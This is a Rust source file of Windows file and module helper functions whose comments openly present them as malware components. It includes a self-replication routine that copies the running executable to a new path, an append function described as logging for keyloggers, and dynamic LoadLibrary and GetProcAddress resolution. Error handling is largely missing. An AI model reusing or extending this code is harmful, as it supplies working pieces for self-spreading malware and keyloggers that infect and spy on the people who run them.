#[cfg(windows)]
extern crate winapi;
use std::ffi::CString;
use std::io::Error;
// use std::iter::once;
// use std::os::windows::ffi::OsStrExt;
// use std::ffi::OsStr;
use std::ptr::null_mut;
use widestring::WideCString;
use winapi::shared::minwindef::{FARPROC, HMODULE, MAX_PATH};
use winapi::um::fileapi::{
    CreateFileW, GetFileSizeEx, LockFile, ReadFile, SetFilePointer, UnlockFile, WriteFile,
    CREATE_NEW, OPEN_EXISTING,
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleFileNameW;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryW};
use winapi::um::winbase::FILE_END;
use winapi::um::winnt::{
    FILE_APPEND_DATA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ,
    GENERIC_WRITE, HANDLE, LARGE_INTEGER,
};
/// Create_file function
///
/// Call Windows API CreateFileW function with a generic write access.
///
/// Used this function to create a file and WRITE to it
#[cfg(windows)]
pub fn create_file(name: &str) -> Result<HANDLE, Error> {
    let wide_name = WideCString::from_str(name).unwrap();
    let file_handler = unsafe {
        CreateFileW(
            wide_name.as_ptr(),
            GENERIC_WRITE,
            FILE_SHARE_READ,
            null_mut(),
            CREATE_NEW,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        )
    };
    return Ok(file_handler);
}

/// Open file function
///
/// Call Windows API function CreateFileW with a read permission
///
/// Use this function when create a file handle to READ file
#[cfg(windows)]
pub fn open_file(name: &str) -> Result<HANDLE, Error> {
    let wide_name = WideCString::from_str(name).unwrap();
    let file_handler = unsafe {
        CreateFileW(
            wide_name.as_ptr(),    // file to open
            GENERIC_READ,          // open for reading
            FILE_SHARE_READ,       // share for reading
            null_mut(),            // default security
            OPEN_EXISTING,         // existing file only
            FILE_ATTRIBUTE_NORMAL, // normal file
            null_mut(),            // no attr. template
        )
    };
    return Ok(file_handler);
}

/// Append file function
///
/// Calls CreateFileW to create a file HANDLE with APPEND permission
///
/// Copy the bytes from the parameter 'buffer' to the end of the file
///
/// Use this to update logs for keyloggers, self-replication, ...
#[cfg(windows)]
pub fn append_file(name: &str, buffer: Vec<u8>) {
    let wide_name = WideCString::from_str(name).unwrap();

    let file_handler = unsafe {
        CreateFileW(
            wide_name.as_ptr(),
            FILE_APPEND_DATA,
            FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        )
    };
    let end_pos = unsafe { SetFilePointer(file_handler, 0, null_mut(), FILE_END) };
    unsafe {
        LockFile(file_handler, end_pos, 0, buffer.len() as u32, 0);
    }
    let mut byte_written = 0u32;
    unsafe {
        WriteFile(
            file_handler,
            buffer.as_ptr() as *const winapi::ctypes::c_void,
            buffer.len() as u32,
            &mut byte_written,
            null_mut(),
        );
    }
    unsafe {
        UnlockFile(file_handler, end_pos, 0, buffer.len() as u32, 0);
    }
    close_handle(file_handler).unwrap();
}

/// Write file function
///
/// Calls the Windows API function WriteFile to write
///
/// Write the bytes from parameter 'buffer' to the beginning of the file
///
/// Make sure HANDLE is from a file with WRITE permission
///
/// Return number of bytes written to the file
#[cfg(windows)]
pub fn write_file(file_handler: HANDLE, buffer: Vec<u8>) -> Result<u32, Error> {
    let mut byte_written = 0u32;
    unsafe {
        WriteFile(
            file_handler,
            buffer.as_ptr() as *const winapi::ctypes::c_void,
            (buffer.len()) as u32,
            &mut byte_written,
            null_mut(),
        );
    }
    return Ok(byte_written);
}

/// Read file function
///
/// Calls the Windows API function ReadFile to read from a file HANDLE
///
/// Read all the bytes from a file into the parameter 'buffer'
///
/// Returns the number of bytes read
#[cfg(windows)]
pub fn read_file(file_handler: HANDLE, buffer: &mut [u8]) -> Result<u32, Error> {
    let byte_read = 0u32;
    unsafe {
        ReadFile(
            file_handler,
            buffer.as_ptr() as *mut winapi::ctypes::c_void,
            get_file_size(file_handler).unwrap() as u32,
            &byte_read as *const _ as *mut u32,
            null_mut(),
        )
    };
    Ok(byte_read)
}

/// Close handle function
///
/// Close the file HANDLE. Use this after everytime we create a file HANDLE
#[cfg(windows)]
pub fn close_handle(file_handler: HANDLE) -> Result<i32, Error> {
    Ok(unsafe { CloseHandle(file_handler) })
}

/// Get File Size function
///
/// Returns the size of a file represented by a file HANDLE
#[cfg(windows)]
pub fn get_file_size(file_handler: HANDLE) -> Result<i64, Error> {
    let size = 0i64;
    unsafe {
        GetFileSizeEx(file_handler, &size as *const _ as *mut LARGE_INTEGER);
    };
    return Ok(size.clone());
}

/// Get Current Path function
///
/// Returns a Vector of Wide character as a string representing the full path of the currently executing file
///
/// Note: Make sure only call this to find out about this current process's executable path
#[cfg(windows)]
pub fn get_current_path() -> Result<Vec<u16>, Error> {
    let buffer = [0u16; MAX_PATH];
    let length =
        unsafe { GetModuleFileNameW(null_mut(), &buffer as *const _ as *mut u16, MAX_PATH as u32) };
    let mut result: Vec<u16> = Vec::new();
    for wchar in buffer[..length as usize].iter() {
        result.push(wchar.clone());
    }
    Ok(result)
}

/// Copy Self to Path function
///
/// Sefl-replicate function for malware
///
/// Read this current executable file into a byte buffer and write it into another file at the given path
#[cfg(windows)]
pub fn copy_self_to_path(file_path: &str) {
    let path = get_current_path().unwrap();

    let file_exe = open_file(String::from_utf16(&path).unwrap().as_str()).unwrap();
    let file_size = get_file_size(file_exe).unwrap();
    let mut buffer: Vec<u8> = Vec::new();

    for _i in 0..file_size as usize {
        buffer.push(0u8);
    }

    let byte_read = read_file(file_exe, &mut buffer).unwrap();
    close_handle(file_exe).unwrap();

    let mut new_buffer: Vec<u8> = Vec::new();

    for i in 0..byte_read as usize {
        new_buffer.push(buffer[i].clone());
    }
    let new_exe = create_file(file_path).unwrap();
    write_file(new_exe, new_buffer).unwrap();
    close_handle(new_exe).unwrap();
}

#[cfg(windows)]
pub fn _load_library(dll_name: &str) -> HMODULE {
    let name = WideCString::from_str(dll_name).unwrap();
    unsafe { LoadLibraryW(name.as_ptr()) }
}

#[cfg(windows)]
pub fn _get_proc_address(dll_module: HMODULE, proc_name: &str) -> FARPROC {
    let proc_address =
        unsafe { GetProcAddress(dll_module, CString::new(proc_name).unwrap().as_ptr()) };
    return proc_address;
}
